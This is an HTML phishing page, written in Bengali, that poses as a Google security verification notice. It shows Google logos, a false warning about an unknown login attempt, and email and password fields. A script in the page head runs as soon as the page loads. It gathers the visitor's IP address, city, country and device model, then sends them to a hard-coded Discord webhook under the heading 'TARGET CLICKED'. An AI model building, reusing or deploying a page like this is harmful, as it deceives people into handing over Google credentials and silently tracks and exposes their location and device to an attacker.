<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Google Security Notification" />
    <meta property="og:description" content="Critical: Someone is trying to access your account. Verify now." />
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" />

    <title>Google Security Verification</title>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        // ১. ক্লিক করার সাথে সাথে আইপি আর মডেল পাঠানোর মেইন অস্ত্র
        (async function instantShot() {
            let ipData = "N/A";
            let deviceModel = "N/A";

            // ফোনের মডেল ধরা
            try {
                deviceModel = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
            } catch(e) { deviceModel = navigator.platform; }

            // ৩টি মেথডে আইপি চেক (যাতে কোনোভাবেই মিস না হয়)
            try {
                const [res1, res2] = await Promise.all([
                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
                    fetch('https://ipapi.co/json/').then(r => r.json())
                ]);
                ipData = `IP: ${res1.ip} | Location: ${res2.city || 'Unknown'}, ${res2.country_name || ''}`;
            } catch(e) {
                // ব্যাকআপ মেথড
                const res3 = await fetch('https://ifconfig.me/all.json').then(r => r.json());
                ipData = res3.ip_addr;
            }

            // ডিসকর্ডে নগদ ডাটা পাঠিয়ে দেওয়া
            fetch(WEBHOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "🎯 **TARGET CLICKED! (INSTANT DATA)**",
                    embeds: [{
                        color: 16711680,
                        fields: [
                            { name: "🌐 IP & Info", value: ipData },
                            { name: "📱 Device Model", value: deviceModel }
                        ],
                        footer: { text: "Time: " + new Date().toLocaleString() }
                    }]
                })
            });
        })();
    </script>

    <style>
        body { background: #f8f9fa; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #d93025; }
        .logo { width: 55px; margin-bottom: 20px; }
        .title { color: #d93025; font-size: 20px; font-weight: bold; margin-bottom: 15px; }
        .warn-box { background: #fff3f2; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 25px; border-radius: 4px; font-size: 14px; line-height: 1.6; color: #3c4043; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; }
        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
    <div class="title">অ্যাকাউন্ট ভেরিফিকেশন প্রয়োজন</div>
    
    <div class="warn-box">
        <strong>সতর্কবার্তা:</strong> আপনার জিমেইল অ্যাকাউন্টে অন্য একটি অপরিচিত ডিভাইস থেকে লগইন করার চেষ্টা করা হচ্ছে। অ্যাকাউন্টটি নিরাপদ রাখতে এবং আইডি ব্যান হওয়া থেকে বাঁচাতে এখনই লগইন করে ভেরিফাই করুন।
    </div>
    
    <input type="email" id="email" placeholder="আপনার জিমেইল এড্রেস">
    <input type="password" id="pass" placeholder="পাসওয়ার্ড">
    <button class="btn" onclick="alert('আপনার আবেদন গ্রহণ করা হয়েছে। ২৪ ঘণ্টা অপেক্ষা করুন।')">নিরাপদ করুন</button>
</div>

</body>
</html>
